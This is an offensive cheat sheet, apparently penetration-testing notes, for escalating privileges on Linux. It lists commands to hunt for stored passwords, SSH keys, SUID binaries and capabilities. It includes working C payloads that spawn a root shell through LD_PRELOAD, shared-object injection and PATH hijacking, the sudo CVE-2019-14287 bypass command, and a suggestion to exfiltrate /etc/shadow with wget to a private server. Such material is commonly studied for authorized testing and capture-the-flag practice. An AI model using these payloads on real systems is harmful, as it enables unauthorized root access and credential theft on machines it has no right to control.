# ***Manual Linux Privilege Escalation Checks***

## System Enumeration

*Anything system related.*

### *Kernel Exploits*

*An outdated kernel version may lead to easy wins.*

    uname -a

### *Finding Running services*

    ps aux
    ps aux | grep root

## **[PASSWORDS AND FILE PERMISSIONS]**

*A password or sensitive file disclosure can give us important information.*

### *Stored Passwords*

    history
    cat .bash_history

*We can also attempt to locate the password name being searched. Think outside the box.*

For mentions of `PASSWORD=`: `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null`

For files named `password`: `locate password | more`

>We can attempt these commands with `PASSWORD=` , `passwd`, `password`, etc.

### *Weak File Permissions*

Look for **read or write** permissions to `/etc/shadow`

Look for **write** permission to `/etc/passwd`

Anything interesting in `/etc/group` ?


### *SSH Keys*

    find / -name id_rsa 2>/dev/null
    find / -name authorized_keys 2>/dev/null
    
## **[SUDO]**

*Abusing sudo to gain root.*

### *Sudo Shell Escaping*

    sudo -l

Shell escape using an exploitable binary using [GTFOBins](https://gtfobins.github.io/)

### *Intended Functionality*

Is there any intended functionality we can abuse from a sudo'able binary? Example: use `wget` to upload the `/etc/shadow` file to our private server?

### *`env_keep+=ENV_PRELOAD` is present*

*We want to use the ENV_PRELOAD feature in order to preload a malicious payload.*

1. Create the following C script named `<NAME>.so`

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Compile it : `gcc -fPIC -shared -o <NAME>.so <NAME>.c -nostartfiles`

3. Set LD_PRELOAD as shell.so : `sudo LD_PRELOAD=<PATH TO SHELL FILE> <ANY SUDO'ABLE COMMAND>`

### *Version Specific Exploits*

#### *Abusing CVE-2019-14287 (sudo version <1.8.28)*

[CVE-2019-14287](https://www.exploit-db.com/exploits/47502) Comes in handy if we can sudo as any user, except root (`!root`).

1. Check sudo version: `sudo -V`

2. If the sudo version is below 1.8.28, use this command to run as root: `sudo -u#-1 <COMMAND>`

#### *Abusing CVE-2019-18634 (sudo version <1.8.26)*
[Exploit for CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634). Works if `pw feedback` is present.

1. Check sudo version: `sudo -V`

2. Run the exploit.

## **[SUID]**

*Abuse the SUID files to gain privs.*

### *Search for SUID Files*

    find / -perm -u=s -type f 2>/dev/null
    find / -type f -perm -04000 -ls 2>/dev/null
    
### *Share Object Injection*

Look to replace / create a file being called in a script.

```
#include <stdio.h>                                                          
#include <stdlib.h>                                                         
                                                                            
static void inject() __attribute__((constructor));                          
                                                                            
void inject() {                                                             
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); 
}
```

Compile: `gcc -shared -o <NAME>.so -fPIC <NAME>.c`

### *Binary Symlink*

[WIP]

### *Environmental Variables*

We are looking at scripts that make use of the `$PATH` shortcuts.

To see what kind of `$PATH` shortcut may be used, we can run the `strings` command to read the script.

If a shortcut is being used, we abuse the `$PATH` and "hijack" it. In order to do so, a malicious script must be ran instead of the intended command.

1. Make a malicious script named the same way as the `$PATH` command we are looking to hijack
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/<COMMAND NAME>.c`

2. Compile: `gcc /tmp/<COMMAND NAME>.c -o /tmp/<COMMAND NAME>`

3. Add /tmp to `$PATH`: `export PATH=/tmp:$PATH`

4. Run the script.

## [CAPABILITIES]

*Abuse capabilities to get higher privileges*

    getcap -r / 2>/dev/null
